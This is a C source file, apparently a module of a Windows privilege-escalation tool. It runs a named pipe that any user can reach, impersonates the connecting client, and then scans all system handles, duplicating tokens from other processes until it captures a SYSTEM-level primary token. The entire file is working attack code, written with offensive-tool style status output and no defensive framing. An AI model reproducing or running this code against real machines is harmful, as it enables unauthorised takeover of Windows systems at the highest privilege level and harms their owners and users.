#include "../includes/pipe.h"
#include "../includes/token.h"

static PSYSTEM_HANDLE_INFORMATION GetSystemHandles(void) {
    ULONG size = 0x10000;
    PSYSTEM_HANDLE_INFORMATION info = NULL;
    NTSTATUS st;
    for (;;) {
        info = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(),
                                                      HEAP_ZERO_MEMORY, size);
        if (!info) return NULL;
        st = _NtQuerySystemInformation(SystemHandleInformation, info, size, &size);
        if (NT_SUCCESS(st)) break;
        HeapFree(GetProcessHeap(), 0, info);
        info = NULL;
        if (st == STATUS_INFO_LENGTH_MISMATCH) { size *= 2; continue; }
        break;
    }
    return info;
}

static HANDLE OpenProcessById(DWORD pid, ACCESS_MASK access) {
    OBJECT_ATTRIBUTES oa = {0};
    oa.Length = sizeof(oa);
    CLIENT_ID cid = {0};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    HANDLE hProc = NULL;
    _NtOpenProcess(&hProc, access, &oa, &cid);
    return hProc;
}

DWORD WINAPI PipeServerThread(LPVOID param) {
    PIPE_CTX *ctx = (PIPE_CTX*)param;
    ctx->hSystemToken = NULL;

    PSECURITY_DESCRIPTOR pSd = NULL;
    ULONG sdSize = 0;
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &pSd, &sdSize)) {
        fprintf(stderr, "[-] ConvertStringSecurityDescriptorToSecurityDescriptor failed: %lu\n",
                GetLastError());
        SetEvent(ctx->hReady);
        return 1;
    }

    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength              = sizeof(sa);
    sa.lpSecurityDescriptor = pSd;
    sa.bInheritHandle       = FALSE;

    HANDLE hPipe = CreateNamedPipeW(
        ctx->PipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        255, 521, 0, 123, &sa
    );
    LocalFree(pSd);

    if (hPipe == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CreateNamedPipeW failed: %lu\n", GetLastError());
        SetEvent(ctx->hReady);
        return 1;
    }
    printf("[+] Named pipe: %ls\n", ctx->PipeName);

    BOOL connected = ConnectNamedPipe(hPipe, NULL);
    if (!connected && GetLastError() != ERROR_PIPE_CONNECTED) {
        fprintf(stderr, "[-] ConnectNamedPipe failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        SetEvent(ctx->hReady);
        return 1;
    }
    printf("[+] Pipe client connected\n");

    if (!ImpersonateNamedPipeClient(hPipe)) {
        fprintf(stderr, "[-] ImpersonateNamedPipeClient failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        SetEvent(ctx->hReady);
        return 1;
    }
    printf("[+] Impersonation OK - scanning for SYSTEM token\n");

    PSYSTEM_HANDLE_INFORMATION shi = GetSystemHandles();
    if (shi) {
        DWORD  lastPid  = 0;
        HANDLE hProc    = NULL;
        HANDLE hCurrent = (HANDLE)(LONG_PTR)-1;

        for (ULONG i = 0; i < shi->NumberOfHandles && ctx->hSystemToken == NULL; i++) {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO *e = &shi->Handles[i];
            DWORD pid = e->UniqueProcessId;

            if (pid != lastPid) {
                if (hProc) { _NtClose(hProc); hProc = NULL; }
                hProc   = OpenProcessById(pid, PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION);
                lastPid = pid;

                if (hProc) {
                    HANDLE hProcTok = NULL;
                    if (NT_SUCCESS(_NtOpenProcessToken(hProc,
                                   TOKEN_QUERY | TOKEN_DUPLICATE, &hProcTok))) {
                        if (IsSystemToken(hProcTok)) {
                            DWORD rid   = GetTokenIntegrityRID(hProcTok);
                            int   itype = GetTokenType(hProcTok);
                            int   ilvl  = (itype == TokenImpersonation)
                                          ? GetTokenImpersonationLevel(hProcTok)
                                          : SecurityImpersonation;
                            if (ilvl >= SecurityImpersonation &&
                                rid  >= SECURITY_MANDATORY_SYSTEM_RID) {
                                HANDLE hDup = DuplicateAsPrimary(hProcTok);
                                if (hDup) {
                                    printf("[+] Found SYSTEM primary token (PID %lu)\n", pid);
                                    ctx->hSystemToken = hDup;
                                    _NtClose(hProcTok);
                                    break;
                                }
                            }
                        }
                        _NtClose(hProcTok);
                    }
                }
            }

            if (!hProc) continue;
            if (e->ObjectTypeIndex != OBJECT_TYPE_TOKEN) continue;
            if (e->GrantedAccess   == 0x0012019F)         continue;

            HANDLE hDup = NULL;
            NTSTATUS st = _NtDuplicateObject(
                hProc,
                (HANDLE)(ULONG_PTR)e->HandleValue,
                hCurrent,
                &hDup,
                TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                0, 0
            );
            if (!NT_SUCCESS(st) || !hDup) continue;

            if (IsSystemToken(hDup)) {
                int   itype = GetTokenType(hDup);
                int   ilvl  = (itype == TokenImpersonation)
                              ? GetTokenImpersonationLevel(hDup)
                              : SecurityImpersonation;
                DWORD rid   = GetTokenIntegrityRID(hDup);

                if (ilvl >= SecurityImpersonation &&
                    rid  >= SECURITY_MANDATORY_SYSTEM_RID) {
                    HANDLE hPrim = DuplicateAsPrimary(hDup);
                    _NtClose(hDup);
                    if (hPrim) {
                        printf("[+] SYSTEM token found (PID %lu, handle 0x%X)\n",
                               pid, e->HandleValue);
                        ctx->hSystemToken = hPrim;
                        break;
                    }
                    continue;
                }
            }
            _NtClose(hDup);
        }

        if (hProc) _NtClose(hProc);
        HeapFree(GetProcessHeap(), 0, shi);
    }

    RevertToSelf();
    CloseHandle(hPipe);
    SetEvent(ctx->hReady);
    return 0;
}
